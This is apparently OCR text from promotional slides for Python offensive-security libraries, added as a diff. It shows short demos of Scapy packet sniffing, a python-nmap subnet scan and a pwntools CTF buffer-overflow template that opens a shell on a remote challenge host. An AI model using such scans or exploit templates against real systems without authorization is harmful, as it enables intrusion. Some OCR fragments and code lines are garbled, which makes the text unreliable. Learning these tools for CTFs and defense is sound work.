@@ -1,0 +1,99 @@
+--- scene_01.jpg ---
+Scapy
+Packet Crafting & Network Sniffing
+eee scapy_demo.py — Visual Studio Code
+® scapy_demo. py
+1 # Import sniff, IP and TCP layers from Scapy
+from scapy.all import sniff, IP, TCP
+2
+3
+4 # Callback — invoked once per captured packet
+5 def process_pkt(pkt):
+6 if IP in pkt and TCP in pkt:
+7 sre = pkt[IP].src # source IP
+8 dst = pkt[IP].dst # destination IP
+9 print(f"{src} -> {dst} [{pkt[TCP].dport}]")
+ll # Sniff 10 packets on port 443, run callback each time
+12 sniff(filter="tcp port 443", count=10, prn=process_pkt)
+TERMINAL
+$ python scapy_demo. py
+192.168.1.5 -> 93.184.216.34 [443]
+10.0.0.12 -> 142.250.80.46 [443]
+192.168.1.5 -> 93,184.216.34 [443]
+$
+Craft, send, sniff and analyze raw network packets.
+Ideal for recon automation, protocol fuzzing, and
+building custom offensive tools in pure Python.
+@kerem.tech
+--- time_01.jpg ---
+Python ibganyfor
+povoerseety\ 4 ¢
+--- time_02.jpg ---
+nee cry
+--- time_03.jpg ---
+python-nmap
+Port Scanning & Service Enumeration
+eee port_scan.py — Visual Studio Code
+®port_scan.py
+# Python wrapper around the Nmap CLI tool
+import nmap
+# Create scanner and run SYN scan with version detection
+nm.scan("192.168.1.0/24", "22,80,443,8080", "-sV")
+# Iterate hosts and print open ports with service info
+1
+2
+3
+4
+5 nm = nmap.PortScanner()
+6
+7
+8
+9
+for host in nm.all_hosts():
+10 for port in nm[host]["tcp"]:
+11 sve = nm[host] ["tcp"] [port] ["name"]
+12 print(f"{host}:{port} {svc}")
+TERMINAL
+$ python port_scan.py
+192.168.1.1:22 ssh
+192.168.1.5:80 http
+192.168.1.5:443 https
+$
+Python wrapper that drives Nmap under the hood.
+Automate port scanning, OS detection, and service
+enumeration directly inside your Python scripts.
+@kerem.tech
+Fer baeae T
+BY
+--- time_04.jpg ---
+pwntools
+CTF & Binary Exploit Development
+eee exploit.py — Visual Studio Code ¥
+*exploit.py
+1
+N
+uit
+12
+a3
+# pwntools: the standard CTF exploit framework \)
+from pwn import * **
+# Set target architecture for shellcode generation
+context.arch = "“amd64"
+# Connect to remote CTF challenge service :
+io = remote("challenge.ctf.io", 4444) Oe
+# Build buffer overflow payload: padding + ret address i -
+payload = cyclic(64) + p64(0x401337)
+io.sendlineafter("Input: ", payload)
+io.interactive() # Drop into shell
+TERMINAL
+$
+python exploit.py
+[+] Opening connection to challenge.ctf.io0:4444
+[+] Sending payload (72 bytes)
+[*] Switching to interactive mode .
+$
+Battle-tested CTF and exploit development framework.
+Simplifies buffer overflows, ROP chains, shellcode
+generation, and remote binary exploitation in Python.
+@kerem.tech eoeeeeces
+ee T
